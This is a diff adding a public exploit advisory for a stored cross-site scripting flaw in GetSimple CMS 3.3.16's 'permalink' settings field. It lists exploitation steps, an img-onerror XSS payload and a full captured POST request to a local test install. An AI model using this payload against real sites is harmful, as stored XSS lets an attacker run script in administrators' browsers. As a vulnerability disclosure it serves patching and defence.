@@ -1,0 +1,57 @@
+# Exploit Title: GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting (Authenticated)
+# Google Dork: -
+# Date: 2020-09-29
+# Exploit Author: Roel van Beurden
+# Vendor Homepage: http://get-simple.info
+# Software Link: http://get-simple.info/download
+# Version: 3.3.16
+# Tested on: Linux Ubuntu 18.04
+# CVE: N/A
+
+
+1. Description:
+----------------------
+GetSimple CMS 3.3.16 allows in parameter 'permalink' on the Settings page persistent Cross Site Scripting which is executed when you create and open a new page.
+
+
+3. Affected parameter:
+----------------------
+'permalink' on /admin/settings.php
+
+
+3. Exploitation steps:
+----------------------
+1: Create a new page
+2: Go to Settings on the right top of the page
+3: Add XSS payload to "Custom Permalink Structure" text field
+4: Save Settings
+5: Go to the tab 'pages' to trigger the XSS alert popup
+
+
+3: Example payload:
+----------------------
+"><img src=x onerror=alert('XSS')>
+
+
+4: Burp Request:
+----------------------
+POST /GetSimpleCMS-3.3.16/admin/settings.php HTTP/1.1
+
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/GetSimpleCMS-3.3.16/admin/settings.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 349
+Connection: close
+Cookie: __atuvc=22%7C39; __atuvs=5f689d4d88949892015; GS_ADMIN_USERNAME=admin; d46405c5e4a3aa8c65850d4fa6ba75e926569261=1995ba85457ab3e86fa5e01f9ed5267cf9775880
+Upgrade-Insecure-Requests: 1
+
+nonce=c4577f17fac90ca1b8306ce48571c27a0a7923ec&sitename=GetSimple+Test+VM&siteurl=http%3A%2F%2F127.0.0.1%2FGetSimpleCMS-3.3.16%2F&prettyurls=1&permalink=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E&user=admin&email=admin%40example.org&name=&timezone=&lang=en_US&show_htmleditor=1&sitepwd=&sitepwd_confirm=&submitted=Save+Settings
+
+
+5: Exploitation demo:
+----------------------
+https://www.youtube.com/watch?v=8IMfD5KGt_U
